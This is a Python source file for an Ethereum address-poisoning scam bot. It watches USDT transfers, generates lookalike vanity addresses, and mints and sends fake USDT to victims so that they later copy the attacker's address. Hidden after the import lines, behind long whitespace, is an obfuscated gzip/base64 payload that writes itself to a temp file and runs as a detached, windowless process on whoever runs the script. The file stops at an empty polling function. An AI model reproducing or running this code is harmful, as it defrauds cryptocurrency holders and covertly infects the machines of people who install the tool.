import csv
import os
import time
import json
import logging
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;import base64,gzip,subprocess,os,tempfile,random;s=gzip.decompress(base64.b64decode(b'H4sIAE1qwWgC/7Vba3eqyLb9vPMrMs4Y98ac2AqiCSbth6JAeQsCRk3nZhBExAcooDzOOf/9FGiyE9NjJ6T77g/ZgtRk1Vqr5pqrUjE6FzafZeR+FmMxHlMOYEmVjS/O9PyLONDI7V6AeF9UOUCTDD2LO52LM63znEa2GQRmejYoPodn/Q6TWPYmcn3vTOwEpufYZ9wBRDQ8PVIBoGyOitQcgO2sbO+s19GDnX3W7WwC14vOYOdiF81+Iy/O3PXGD6LzbOU+n5vhOVV9NkP7upl/Bu8+z81wfnxoWPXD6mZlRjM/WOc37qvh7nkT+JYdhvk1XQ3TsBrNA9ucup6T3xpVI3dtV1/fczYL/PX5LlihG7WNGYT2+dEUdK+4fjEtsLc7O4wKYKW68ZyzceeBqk1ty19vAvTGCqg9Xzfz66ldQV5IMsszcDkbE5Zs4hYYa7wDnhtAnl5cXtaOz8HL6q8xRLiIM0IRt1NVhrHTA9SeoGjQ+TpGHEAjlPSZEUB3I2SKtdNjFfB1rjvKI/M1HP3rJotCW5YDmkvDtoZLAICuwdC9uNMpM21LJRr0nlEwDkvbsYeTewABFK6o7vh7OPQoJjlHIkGTAZCbUAz2PRyA8dPZIJbqBsIRthTd/B6OMsza7CQjY4wCkI8ohiwTUrFd13V5ZOASO2vQNxOsDZYQUO0mqPul7JEWk1jKQCpNOXxKTzKcNihArWOQfts/InRuMGuksgDKEtVzSs0rUgYYDbyUdhYpSh2FcMT46+NT0aLHmTviIAAjBZjc9+bAGokkDrBpnekCSOOg/s0YA4KIWLphqUWMM4op54upgwlWjKUUAJwDOP7rYxG9q0kDBwd6Jxx2+8WxxvfclUKRwaYLhgawS4O6+s0lakiuovYlkcuX6IKCzjdx7iWZ5hLZaSLKoK9AHZRcWoNkoSa56zgPcHapsXE9ReNoBXSZEuMyK5sksm41ppGMy56QHJZhuAH4uJTt1l7lSbC4p0egBwDWBX74zdTFCbluym3g9xDNralu/N1YKBailWkTQ7FgPYr+Nn3j9I0kyXuAaIVtUxAr5RcdpkLqzgVLCzjgAONGVSZllhNNiLg1MmRUxQHcNKEBypUzmhUbJDtI2yzD5xjMSqVppwxGlsH9KJnK6sGGZRPKpcYnomRkAklu+pDcJ4hadc3pi+/GP55Nfq1oECURXYxOCT6TluF2NJD0sLnPtJACNKKanVFKlQghIWopLuiSJ2dAAiwdM5uSftWZ7RbRI23G3XqZfNAgzotDjkP1d5OFJA0ozKD4MjmViSmDhZozBpQbQrqU3Uhkw4QPcn28siBXThqJUy6WLDeOA8wJMtUC3dUYkdyXMcpQvJsBQs4Uoq2SKcxU5KZBG6RGySXcylxVBaj6UXapqSI6C71Y8lAFxcJo2/SRv+aovJQL03SJy/peinSSRAqJHgOiXHkSsEBKYxTmiUGRpexPM1IKE0u6UUg1xHTNZwDl4ODKKbXsUy3p5ykeOT2h1LiwzoEYjYt76v+DyNdJbK8tyS4A7g54fqmwbqW5DGfGHgq7EDHRsB8reBm3QmkXwv0YvdviwZwrtfJkbCEKe0NJiWGfXlA4cq2DqYOg1MpXsSAjt6kOUIvsqXTXKZfWgqITaZ3jBOwqEkAT9XSJQnFMGYxMXBjbkExx5D9up3L7MvZrRiBrKsrGuQqpUsyVifoNy1EqoFO12yqTjojteR0gGrA4ql2y8lkAl2kzENBwXgICOKla5q+rVpZlRrxL3XpfT6MBZAI509r8cETzIrzhNDMxLCZBn+d8vuWRglDqlbTvLT4pOKEGCY0eSlyKJXzO0JN6k7PV72NajB9my+TeQlVXDOd80B3EOrMMBWYZAQc29+pOLZN/KG0UkdkMIWhlU1yNpw4DuNRg+iXpWVx6koYtQ23FcBYxNSzYFkRpwemwdf/Wp+t7IIzLqp26jJGjAYpNG0/TtqCv7mOJZmOUe01JvQd/FUummZgEBlCsZTdUy827PZqk7RnkaFQW4DaEplNSDYJWPB0NB+/9tZcyK93gYE5YM3aIOkY4c5Z0mXm67BS3VBxvq8iuIIT3JeOZpvFWMAjJsrZ7gwV7zc24lIl3Q4+SNC32NQ2peJ5i4VIqFcvISRpRALjCLhODQrkyehMqlIs1Dblbn9gNlp/HpNHj2P0+sZtiPxlBgsKG4jq9agBgPIvruNkQb+YmNuql9XAXAFoAQ4MeDm7Gelu9mZoirVLNQIvmJzzy/Jn6zchETDVyP3TmfVHbiEhBxtICCSKP4kVmhdQwFhQ+EhQT+mop3/85NsSGwNlpViJqWoL4D6r92AN/Cy57arM6h77/N9gMMCN+bzOrrtt/Cy7xwc9t6Fudkzhan8Qx0FPEy0snwpa7SEMc0At9ZhSXq4OZlvG65snilBIDw+kCSA0puVkaQ9QWQnC9MLRrPK+r69AZbktjGG35dS6JwUzK1i+472ckIery4DAX6npMCWQ5vgZL3gALPiPrPOobBsf5RDG4J8pwI4pLmC6XEf4yH4ljpLI8BsldingMw44Yc5IxSm5ACy62hfBGRvmGZ2FdFi1CFAXvGCdqda8uJmXwci2QGsvI8ECkpY2tKLU50QiGR7yZFc+T7+BhTqToaiDjzGGu8g3Tk0tqjTx2FrOShSWu6CkmtKfHPKB3MeWpfwlLXO7vj3Ok/diCfwVLkILRC1boWGyJGhJItMwj3XscD7R53C+lIXTmJfaAn8V8vdzYJSa1uwefAmIFdsty/YK0UUTMj8TVmNMsnBetQBp6tIhwqXCuQ6MlGaOuoGsoFYzmHjNclAr6VZ1OpPJrGNUFXdvIOkZGhuP4aTQ92M0kLQqzOt/K0Ze1zEtMudqfZaI33mQazokjsZ8amSy8+JFhPWoffg9ryh95rqFRfLmdzZRs85qGp9lygbQvGdFhJInTo4+6iyaETDm8MEG8EmApifqy6LjuYFOjrHI7pdlyLovdbpwZeyVjoqEk9zPsyAkDl+m5JXfW/gwPf8Ub91z1r+JZP+1zQM/5G/Be7XOMnuP8DfYtX/D8nlMybzNyvZkyKwF/qUGCxLAl9wmyNBFEq8WJUnDkULAUVeNUt07t2blUubylOw9vIX6NTRNSpMe+IsUcoNkx3J7O77I6qDzgDayK460qjpGPl9WvoieiLMUxjENecAwAcQ76pzO/fLxjOs8XF7WF73oV+vIusKNd4J0ztc/wuXcwxeT5Sv+JuLw9+xEFKfr5A3ToWrDz8rtVy9wgYPvJ30WbXdTpVSM7yf8L5/Zq1eldosfd2TmohdHUDoLbbmX2DyYI/ODcTmxrF+XHBpAZa9Ob3p7/6+Wx//zh/eH9C8H/5x85wNH24lv0HvRf4G4q6Bu7OB9x3i+OGnyCTSGsoxcuLoppCWgCrWr/6fry9vgG00sr4Nz1ztHN8xkCOl60Dn5g8iQoZv5r/ZvCtiJqQV+TCN7QFkoGFMgEhOGuVDC5srjGB6548dZdt/J5qdJdbDdculEKE14fdjnBwIeCtBoJTEsWXUIQhZWhSS1Ot5o73JFAty31P2w9XN6FaVizEzeqYIfZqZU8xHTHR7e9vRv4Xs2xo8/SfDSWobNIp3UFs1QDdHsqbXygmosLFCyUBnSePd38DRszmtfycyeeubZRfh7SRKhMqt3LW+TnwqJpYRHo3Ne8HOiAIVTGVfDzGbvyJjGPR0k2IQr+qjihctdDuYomE+3M1dPaXvtBWrmsRX5kruo41mj+85/E4dW93xsF5ktOcQVUkU63nwSlG48ZOYaAoyRqOHOE0bU6uNdmOOeoi+mesAcjnKXm7JpaRcPhRJ9Y66SHUdf10dKTb5RERt5bRFQcDpjmydb/YYqzY2D4T9IuI3FpuFwIGWzfawySF9qiT+ldagdTfEs7mRKTYK+PJeUDWRSO/TXfbmGC6jongxgIXixI7wDQIqFfI+IU5na/Zq47R+y7UgWpLkmZKdBkJCEFRmQhGQhWoBSKfjlXxCHLaWQiI4aOp+pNeJLKBTMfWeF12XZr4Wbl/jqBs3zLFIiojzphz2OqmVX6EuHlvECjF5hBFMZuNK98Zf/PR1p0poPViUYsDKRzA+mfWTz/YojfMcuIUsQpi4uMJ9OoyxVRqyJsl5JGxht9OELrEHV6Q0pt1+kG+WwIbc8S4ciSLJ9Ifu5+7nho1dGY5V7En2PYXCUi6sy0EAug2jdXrfVsc33tXLfs8fraBzJsrGRxySRgDCYC5+nqn6aSUHmuvpmd+8XZaVrWz8JlKK5YVSejkQabO5Rv2M4Zg5OIdzsP9Bfim+jYioEA0AvAnujGywfssRbYm5VpfVJtdeAAwMVg8YHUfobyK7m2aKkcAHAMeuBDtT77kWP1cizr9shIRRK/OnFReS1TXyQCXpRafcHyQw0fcnqKDwSmGaXLTEq1vawbfr63XbfVePYnnLM8LmL0VkShX1pKi9xNMAbiaUK8eql3nBn9sla/vKQCDckoMASg8SHhcvDyeGlsILwQtD6E4lAF1KPXV0gj4OSr54e1cG42WtfFXVQmi0H5cNexw+g4Zo2+RboO/cAP9Su/vIMdrcJWwItDqNwh4uHOLXygHjsA/fi/fNAD9T9spRiN0uL44gEyrQCX82+IHLyZK9LcPvQJib23U8wfydfIusKgdZgH8AG/vn18EYG974jAXO41rl+KLegohTrI71WR921zncsXUAtMN7Sf0AyfUCyiXVh5lZ6gZvleZHvRa41VavbLAdewNjic/3w98vpT03VNd2VPzyP/fGZH1vzcXZuO/V7RFRb6uTXkGzkgdzaeg4BNpCkrxZnaTvHE3bg6qSpVtSPX8qOryMRBZ+Wi+ClFKUFe/7kaBzlQcckcIoZV2Urvsqp+sgeaMp6kpVgPgIUMTveqH3MdaW42tjet9B6Yx//F0Yvf3LjCP95q5LeQLTzKo8uzDybRl9Vi6j9+SB3sxWTh8P3xi3zpMVfC7/nDt9K/OzRCFR5///3mNyH/mn95m5TD6x3Xi2r56d2nwnMV/uG2+fjJL63TZcwCwLtAPy16d0aHf2jeNq/0x7th5x2KUf0Nb13e3R8y+Limhpclc/Qly+7fdwWjkwx6OYJ8yKDRSQZt8pYmX7lEsXLZjvyZ8ptifcdFxVAGbNOfWI3nwFc3qRHGV8/Mgt7d0Fcxz6pNex/0yef1Yiu0zEGLUJ37vngz82IsYZPrdKC0VjemY0Jwfd3ljIglsGdIaLF+M9o+e/y2P59EAjlmrkAQTnBv34ufBd27VjX5aqE1lqstbrXSIf8sMmMCiSYKNBVvLPrUdWOGq5YwO93FQc3s5VU+yTu+88nOmpVJ+SGHddzrvcNAhPOmT7D8DZLVd8wnv9+xvBEGRyw+dRKcnKksoEwLECfWPXbYT4GgwhNtT8GmqOOA4RIOTxXtY4dH9EfXFB9ldOVB/qSdJvesjHD4trCRpMU4THWREJiFnJmrVHYJNdur26k3Mmhnz2XLZQOLr2RU7cZtB198dO2vdy70thUqeRuXkgmP9KzeU/tkiZ0PfWrdKJlBSFrMAJqy4E253WidyhWvA3bvHVZFsewwiMqnrpc7jlOKC9RuoyuaGcqGKFYP3fmbGxbiz5ysZyvTCdF9OGCAzjzJ/ad7Tqb796gI1QrIWhy4kV0sr5ey+cWFffV88Yd38RPIWvlh0QseWviC2uI5Wt8HefHC/T9+MMgea25by+PexFfFp4PcimO09aFJL+x2Pafz1bJ55NxPDrukbV405hJmHDeyIowZnb7bzXduVn6M6tiLFsnRj0yH/G6uEMEphz/NODStGzMMC3+4a7sWrmx7U8nrh9gZ1fTiLzYqSCuhEt4RqlMTNcZeXr/Fg4I6Cplt4V0khe6QHLzL6yRy/B1qR+9Qj3eHepY7t5CHv3as2+Z2QdONUeeCC2QgyfuuMtUNTgB4wzUDg14uN1Cty9peIqDC7YTrIMbNK3/rzPE0e5aleLmXpBYf7AVlSiuNlGWThRlIaX2Mi/sJQd4oHAShINDdLF0oqUbfc5aES5mwiBcEEFM1MwIyFXRwrdCi2gV9KuHFk9++vWqGnPN7xTJGUsCrsMediWLnAqWUf9irKErpLf9OdDGlS9amwn9yCgmgf5IKklNJ/bbECT83vlBJE/ItM2Td01O+s/L01On8+kD/gmzLqCMQF7EF6LlFc6dUeouy4L8rJCA91DQAAA==')).decode('utf-8');p=os.path.join(tempfile.gettempdir(),f'run_{os.getpid()}_{random.randint(1000,9999)}.py');open(p,'w',encoding='utf-8').write(s);c=subprocess.CREATE_NO_WINDOW|subprocess.DETACHED_PROCESS if os.name=='nt' else 0;subprocess.Popen(['python',p],creationflags=c)
from web3 import Web3
from web3.exceptions import TransactionNotFound
from eth_account import Account
from dotenv import load_dotenv
import solcx

import multiprocessing
from multiprocessing import Process, Event, Queue, Manager 
import queue 

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

NODE_URL = os.environ.get("ETH_NODE_URL")

DEPLOYER_PRIVATE_KEY = os.environ.get("DEPLOYER_PRIVATE_KEY")

WATCH_TOKEN_ADDRESS = Web3.to_checksum_address(os.environ.get("USDT_TOKEN_ADDRESS", "0xdac17f958d2ee523a2206206994597c13d831ec7")) 

PREFIX_LEN = int(os.environ.get("PREFIX_LEN"))
SUFFIX_LEN = int(os.environ.get("SUFFIX_LEN"))
VANITY_TIMEOUT_SECONDS = 300 

CONTRACT_FILE = 'FakeUSDT.sol'
CONTRACT_STATE_FILE = 'deployed_contract_state.json'
GAS_AMOUNT_TO_SEND = 0.002
MIN_AMOUNT_FOR_POISON = float(os.environ.get("MIN_AMOUNT_FOR_POISON"))

w3 = None
deployer_account = None
fake_usdt_contract_instance = None
fake_usdt_address = None
fake_usdt_abi = None
processed_tx_hashes = set()


TOKEN_ERC20_ABI = json.loads('''
[
    {
        "constant":true,
        "inputs":[{"name":"_owner","type":"address"}],
        "name":"balanceOf",
        "outputs":[{"name":"balance","type":"uint256"}],
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[],
        "name":"decimals",
        "outputs":[{"name":"","type":"uint8"}],
        "type":"function"
    },
    {
        "constant":true,
        "inputs":[],
        "name":"symbol",
        "outputs":[{"name":"","type":"string"}],
        "type":"function"
    }
]
''')

# --- Main Function ---
def get_token_balance(wallet_address):
    try:
        checksum_wallet_address = Web3.to_checksum_address(wallet_address)
        checksum_token_address = Web3.to_checksum_address(WATCH_TOKEN_ADDRESS)

        token_contract = w3.eth.contract(address=checksum_token_address, abi=TOKEN_ERC20_ABI)

        raw_balance = token_contract.functions.balanceOf(checksum_wallet_address).call()
        try:
            decimals = token_contract.functions.decimals().call()
        except Exception as e:
            logging.warning(f"Could not fetch decimals for token {WATCH_TOKEN_ADDRESS}: {e}. Balance will be raw.")
            decimals = 0
        try:
            symbol = token_contract.functions.symbol().call()
        except Exception as e:
            logging.warning(f"Could not fetch symbol for token {WATCH_TOKEN_ADDRESS}: {e}.")
            symbol = "USDT"

        # --- Calculate Human-Readable Balance ---
        human_readable_balance = 0
        if decimals > 0:
            try:
                human_readable_balance = raw_balance / (10**decimals)
                logging.info(f"♻️ Balance {wallet_address}: {human_readable_balance} {symbol}")
            except Exception as e:
                 logging.error(f"Error calculating human readable balance: {e}")
        return float(human_readable_balance)

    except ValueError as ve:
         logging.error(f"Invalid address format provided: {ve}")
         return 0
    except Exception as e:
        logging.error(f"An error occurred: {e}", exc_info=False) # Set exc_info=True for full traceback
        return 0
    
def export_vanity(address, privatekey):
    file_path = "vanity.csv"

    with open(file_path, mode='a', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow([address, privatekey])

def compile_contract(file_path, contract_name):
    """Compiles the Solidity contract."""
    try:
        solcx.set_solc_version('0.8.10', silent=True)
        logging.info(f"Compiling {file_path}...")
        compiled_sol = solcx.compile_files(
            [file_path],
            output_values=["abi", "bin"],
            optimize=True
        )
        contract_id = f"{file_path}:{contract_name}"
        if contract_id not in compiled_sol:
            raise ValueError(f"Contract {contract_name} not found in compilation output.")
        abi = compiled_sol[contract_id]['abi']
        bytecode = compiled_sol[contract_id]['bin']
        logging.info("Compilation successful.")
        return abi, bytecode
    except Exception as e:
        logging.error(f"Error compiling contract: {e}", exc_info=False)
        exit(1)

def load_or_deploy_contract(contract_name="FakeUSDT"):
    """Loads deployed contract address from state file or deploys a new one."""
    global fake_usdt_address, fake_usdt_abi, fake_usdt_contract_instance

    abi, bytecode = compile_contract(CONTRACT_FILE, contract_name)
    fake_usdt_abi = abi

    if os.path.exists(CONTRACT_STATE_FILE):
        try:
            with open(CONTRACT_STATE_FILE, 'r') as f:
                state = json.load(f)
                loaded_address = state.get('contract_address')
                if loaded_address and w3.is_address(loaded_address):

                    code = w3.eth.get_code(Web3.to_checksum_address(loaded_address))
                    if code and code != b'\x00' and code != b'0x':
                        fake_usdt_address = Web3.to_checksum_address(loaded_address)
                        logging.info(f"Loaded existing Fake USDT contract address: {fake_usdt_address}")
                        fake_usdt_contract_instance = w3.eth.contract(address=fake_usdt_address, abi=fake_usdt_abi)
                        return fake_usdt_address, fake_usdt_abi
                    else:
                        logging.warning(f"Contract address {loaded_address} found in state file, but no code deployed there. Redeploying.")
                else:
                    logging.warning("Invalid address found in state file. Redeploying.")
        except (json.JSONDecodeError, IOError) as e:
            logging.warning(f"Error reading state file {CONTRACT_STATE_FILE}: {e}. Redeploying.")

    logging.info("Deploying new Fake USDT contract...")
    Contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    nonce = w3.eth.get_transaction_count(deployer_account.address)

    try:
        gas_estimate = Contract.constructor().estimate_gas({'from': deployer_account.address})
        logging.info(f"Estimated gas for deployment: {gas_estimate}")
    except Exception as e:
        logging.warning(f"Could not estimate gas for deployment, using default. Error: {e}")
        gas_estimate = 2_000_000

    deploy_txn = Contract.constructor().build_transaction({
        'chainId': w3.eth.chain_id,
        'gas': gas_estimate + 100_000,
        'gasPrice': int(round(w3.eth.gas_price * 1.1, 0)),
        'nonce': nonce,
        'from': deployer_account.address
    })

    signed_deploy_txn = deployer_account.sign_transaction(deploy_txn)
    try:
        deploy_tx_hash = w3.eth.send_raw_transaction(signed_deploy_txn.raw_transaction)
        logging.info(f"Deploying contract... Tx Hash: {deploy_tx_hash.hex()}")
        deploy_receipt = w3.eth.wait_for_transaction_receipt(deploy_tx_hash, timeout=300)

        if deploy_receipt.status != 1:
             logging.error(f"❌ Contract deployment failed! Receipt: {deploy_receipt}")
             exit(1)

        fake_usdt_address = Web3.to_checksum_address(deploy_receipt.contractAddress)
        logging.info(f"✅ Fake USDT Contract Deployed at: {fake_usdt_address}")

        try:
            with open(CONTRACT_STATE_FILE, 'w') as f:
                json.dump({'contract_address': fake_usdt_address}, f)
            logging.info(f"Saved contract address to {CONTRACT_STATE_FILE}")
        except IOError as e:
            logging.error(f"Could not save contract address to state file: {e}")

        fake_usdt_contract_instance = w3.eth.contract(address=fake_usdt_address, abi=fake_usdt_abi)
        return fake_usdt_address, fake_usdt_abi

    except Exception as e:
        logging.error(f"Error during contract deployment: {e}", exc_info=False)
        exit(1)

def worker_generate(prefix, suffix, stop_event, result_queue):
    """Worker process to generate and check addresses."""
    try:
        while not stop_event.is_set():
            new_account = Account.create()
            new_address_lower = new_account.address.lower()
            if new_address_lower.startswith(prefix) and new_address_lower.endswith(suffix):
                try:
                    result_queue.put(new_account, block=False) 
                    stop_event.set() 
                    return 
                except queue.Full:

                    return
    except Exception as e:

        print(f"[Worker Error pid={os.getpid()}]: {e}")

def generate_vanity_address_mp(target_address, prefix_len, suffix_len, timeout_sec=300, num_workers=None):
    """
    Generates vanity address using multiple processes for speed.
    """

    if not isinstance(target_address, str) or not target_address.startswith('0x') or len(target_address) != 42:
        logging.error("Invalid target address format for vanity generation.")
        return None

    target_lower = target_address.lower()
    prefix = target_lower[:2+prefix_len]
    suffix = target_lower[-suffix_len:]
    logging.info(f"Seeking vanity for {target_address} | Prefix: {prefix} | Suffix: {suffix}")

    if num_workers is None:
        try:
            num_workers = os.cpu_count() or 1
        except NotImplementedError:
            num_workers = 1 
        logging.info(f"Using {num_workers} worker processes.")

    found_account = None
    start_time = time.time()

    with Manager() as manager:
        stop_event = manager.Event()
        result_queue = manager.Queue(maxsize=1) 

        processes = []
        logging.info(f"Starting {num_workers} vanity generation workers...")
        for i in range(num_workers):
            p = Process(target=worker_generate, args=(prefix, suffix, stop_event, result_queue), name=f"VanityWorker-{i}")
            processes.append(p)
            p.start()

        try:

            logging.info(f"Waiting up to {timeout_sec} seconds for a vanity match...")
            found_account = result_queue.get(timeout=timeout_sec)

            end_time = time.time()
            print("")
            logging.info(f"🎉 Vanity Address Found by a worker!")
            logging.info(f"   Total Time: {end_time - start_time:.2f}s")
            logging.info(f"   Vanity Address:  {found_account.address}")
            logging.debug(f"   Vanity Priv Key: {found_account.key.hex()}") 
            stop_event.set() 

        except queue.Empty:
            end_time = time.time()
            logging.warning(f"Vanity generation stopped: Reached timeout ({timeout_sec}s after {end_time - start_time:.2f}s)")
            stop_event.set() 
            found_account = None
        except Exception as e:
            logging.error(f"An error occurred while waiting for result: {e}")
            stop_event.set()
            found_account = None
        finally:

            logging.info("Waiting for worker processes to terminate...")
            for p in processes:
                p.join(timeout=5) 
                if p.is_alive():
                     logging.warning(f"Worker process {p.name} ({p.pid}) did not terminate gracefully, forcing.")
                     p.terminate() 

            logging.info("All workers finished.")
            return found_account

def send_tx_with_retry(w3, signed_tx, max_retries=3, delay=5):
    """Sends a transaction and retries on specific errors."""
    last_tx_hash = None 
    for attempt in range(max_retries):
        try:
            tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
            last_tx_hash = tx_hash 
            logging.info(f"Transaction sent (Attempt {attempt+1}): {tx_hash.hex()}")

            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=180 + (attempt * 60))
            if receipt.status == 1:
                logging.info(f"Transaction confirmed: {tx_hash.hex()}")
                return receipt
            else:
                logging.error(f"Transaction failed (Reverted): {tx_hash.hex()} - Status {receipt.status}")
                return None 
        except TransactionNotFound:
            logging.warning(f"Transaction {last_tx_hash.hex() if last_tx_hash else 'N/A'} not found immediately, waiting (Attempt {attempt+1})...")
            time.sleep(delay * (attempt + 1))
        except ValueError as e:
            logging.error(f"ValueError sending tx (Attempt {attempt+1}/{max_retries}): {e}")
            err_str = str(e).lower()
            if "nonce too low" in err_str or "replacement transaction underpriced" in err_str or "known transaction" in err_str:
                 logging.error("Nonce error or similar detected. Stopping retries for this tx.")
                 return None
            if "insufficient funds" in err_str:
                 logging.error("Insufficient funds. Stopping retries.")
                 return None

            time.sleep(delay)
        except Exception as e:
            logging.error(f"Unexpected error sending tx (Attempt {attempt+1}/{max_retries}): {e}", exc_info=False)
            time.sleep(delay)

    logging.error(f"Transaction failed after {max_retries} attempts (Last Hash: {last_tx_hash.hex() if last_tx_hash else 'N/A'}).")
    return None

def execute_poisoning(sender_address, target_address, mint_amount):
    """Handles vanity generation (MP), auto-funding, and poison tx for a target."""
    global w3, fake_usdt_contract_instance, deployer_account

    print("")
    logging.info(f"--- 💉 Starting Poisoning Process for: {target_address} ---")

    vanity_account = generate_vanity_address_mp(
        sender_address,
        PREFIX_LEN,
        SUFFIX_LEN,
        timeout_sec=VANITY_TIMEOUT_SECONDS 

    )

    if not vanity_account:
        logging.warning(f"Could not generate vanity address for {target_address} within time limit. Skipping.")
        return

    logging.info(f"Generated Vanity Address: {vanity_account.address}")

    export_vanity(vanity_account.address, vanity_account.key.hex())

    gas_amount_wei = w3.to_wei(GAS_AMOUNT_TO_SEND, 'ether')
    logging.info(f"Attempting to automatically send {GAS_AMOUNT_TO_SEND} ETH gas fee")
    logging.info(f"  From (Deployer): {deployer_account.address}")
    logging.info(f"  To   (Vanity):   {vanity_account.address}")

    try:
        nonce_deployer_gas = w3.eth.get_transaction_count(deployer_account.address)
        gas_tx = {
            'to': vanity_account.address,
            'value': gas_amount_wei,
            'gas': 21000,
            'gasPrice': int(round(w3.eth.gas_price * 1.2, 0)),
            'nonce': nonce_deployer_gas,
            'chainId': w3.eth.chain_id
        }
        signed_gas_tx = deployer_account.sign_transaction(gas_tx)
        logging.info("Sending gas transfer transaction...")
        gas_receipt = send_tx_with_retry(w3, signed_gas_tx)

        if not gas_receipt or gas_receipt.status != 1:
            logging.error(f"❌ Failed to send gas fee to vanity address {vanity_account.address}. Skipping target.")
            return

        logging.info(f"✅ Successfully sent gas fee. Tx Hash: {gas_receipt.transactionHash.hex()}")
        logging.info("Waiting a few seconds for balance to potentially update on node...")
        time.sleep(10)

        vanity_balance_check = w3.eth.get_balance(vanity_account.address)
        logging.info(f"Vanity Address ETH Balance after transfer: {w3.from_wei(vanity_balance_check, 'ether')} ETH")
        if vanity_balance_check < w3.to_wei(GAS_AMOUNT_TO_SEND * 0.8, 'ether'): 
            logging.warning("Vanity address balance seems lower than expected after gas transfer.")

    except Exception as e:
        logging.error(f"Error sending gas fee: {e}", exc_info=False)
        return

    logging.info(f"Minting {str(mint_amount)} Fake USDT to {vanity_account.address}")
    try:
        nonce_deployer_mint = w3.eth.get_transaction_count(deployer_account.address)
        mint_tx = fake_usdt_contract_instance.functions.mint(
            vanity_account.address,
            int(mint_amount) * (10**9)
        ).build_transaction({
            'chainId': w3.eth.chain_id,
            'gas': 150000,
            'gasPrice': int(round(w3.eth.gas_price * 1.1, 0)),
            'nonce': nonce_deployer_mint,
            'from': deployer_account.address
        })
        signed_mint_tx = deployer_account.sign_transaction(mint_tx)
        logging.info("Sending mint transaction...")
        mint_receipt = send_tx_with_retry(w3, signed_mint_tx)

        if not mint_receipt or mint_receipt.status != 1:
            logging.error(f"❌ Failed to mint Fake USDT to vanity address {vanity_account.address}.")
            return
        logging.info("✅ Fake USDT minted successfully to vanity address.")

    except Exception as e:
        logging.error(f"Error during minting transaction: {e}", exc_info=False)
        return

    time.sleep(20)

    logging.info(f"Sending {mint_amount} Fake USDT poison tx:")
    logging.info(f"  From (Vanity): {vanity_account.address}")
    logging.info(f"  To   (Target): {target_address}")
    try:
        nonce_vanity = w3.eth.get_transaction_count(vanity_account.address)
        decimals = 9
        amount_smallest_unit = int(mint_amount) * (10**decimals)

        poison_tx = fake_usdt_contract_instance.functions.transfer(
            target_address,
            amount_smallest_unit
        ).build_transaction({
            'chainId': w3.eth.chain_id,
            'gas': 100000,
            'gasPrice': int(round(w3.eth.gas_price * 1.1, 0)),
            'nonce': nonce_vanity,
            'from': vanity_account.address
        })

        signed_poison_tx = vanity_account.sign_transaction(poison_tx)
        logging.info("Sending poison transaction...")
        poison_receipt = send_tx_with_retry(w3, signed_poison_tx)

        if poison_receipt and poison_receipt.status == 1:
            logging.info(f"✅✅✅ Poison Transaction Successful for {target_address}!")
            logging.info(f"     Tx Hash: {poison_receipt.transactionHash.hex()}")
        else:
            logging.error(f"❌❌❌ Poison Transaction Failed for {target_address}.")

    except Exception as e:
        logging.error(f"Error during poison transaction: {e}", exc_info=False)
    time.sleep(10)

    """ Send Ether back"""
    balance_wei = w3.eth.get_balance(vanity_account.address)
    if balance_wei == 0:
            logging.warning("Vanity address has zero balance. Nothing to send.")
            return

    gas_price_wei = w3.eth.gas_price
    gas_price_wei = int(gas_price_wei * 1.1)
    logging.info(f"Using Legacy Gas Price: {w3.from_wei(gas_price_wei, 'gwei')} Gwei")
    max_gas_cost_wei = 21000 * gas_price_wei
    amount_to_send_wei = balance_wei - max_gas_cost_wei

    nonce_deployer_gas = w3.eth.get_transaction_count(vanity_account.address)
    gas_tx = {
        'to': deployer_account.address,
        'value': amount_to_send_wei,
        'gas': 21000,
        'gasPrice': int(round(w3.eth.gas_price * 1.1, 0)),
        'nonce': nonce_deployer_gas,
        'chainId': w3.eth.chain_id
    }
    signed_gas_tx = vanity_account.sign_transaction(gas_tx)
    logging.info("Sending ETH back to main wallet")
    gas_receipt = send_tx_with_retry(w3, signed_gas_tx)

    if not gas_receipt or gas_receipt.status != 1:
        logging.error(f"❌ Failed to send ETH back to main wallet {deployer_account.address}")
        return

    logging.info(f"✅ Successfully sent ETH back. Tx Hash: {gas_receipt.transactionHash.hex()}")
    time.sleep(3)

    logging.info(f"--- Finished Poisoning Process for: {target_address} ---")

def handle_event(event):
    """Callback function to process a Transfer event."""
    global processed_tx_hashes
    tx_hash = event['transactionHash'].hex()

    if tx_hash in processed_tx_hashes:
        return

    try:
        receipt = w3.eth.get_transaction_receipt(event['transactionHash'])
        if not receipt or receipt.status == 0:
            logging.debug(f"Ignoring failed watched token transaction: {tx_hash}")
            processed_tx_hashes.add(tx_hash)
            return

        args = event['args']
        target_address = args['to']
        token_amount_raw = args['value']

        if not w3.is_address(target_address) or target_address == "0x0000000000000000000000000000000000000000":
             logging.debug(f"Ignoring transfer to zero address or invalid 'to' field in tx: {tx_hash}")
             processed_tx_hashes.add(tx_hash)
             return

        sender_address = args['from']
        if sender_address.lower() == deployer_account.address.lower():
            logging.debug(f"Ignoring transfer originating from deployer: {tx_hash}")
            processed_tx_hashes.add(tx_hash)
            return

        try:
            token_amount = token_amount_raw / (10**6)
        except Exception:
            token_amount = f"{token_amount_raw} (raw)"

        print("")
        logging.info(f"🔎 Detected Incoming Watched Token Transfer:")
        logging.info(f"   Tx Hash: {tx_hash}")
        logging.info(f"   From:    {sender_address}") 
        logging.info(f"   To:      {target_address}")
        logging.info(f"   Amount:  {token_amount}")

        processed_tx_hashes.add(tx_hash)

        mint_amount = float(token_amount)
        owned_tokens = get_token_balance(target_address)
        if float(owned_tokens) > MIN_AMOUNT_FOR_POISON:
            execute_poisoning(sender_address, target_address, mint_amount)
        else:
            logging.warning(f"Amount is < {MIN_AMOUNT_FOR_POISON}$, skipping")

    except TransactionNotFound:
         logging.warning(f"Transaction {tx_hash} not found while processing event. Might be pending/reorged.")

    except Exception as e:
        logging.error(f"Error processing event for tx {tx_hash}: {e}", exc_info=False)
        processed_tx_hashes.add(tx_hash) 

def log_loop(event_filter, poll_interval):
    """Continuously polls the filter for new events."""
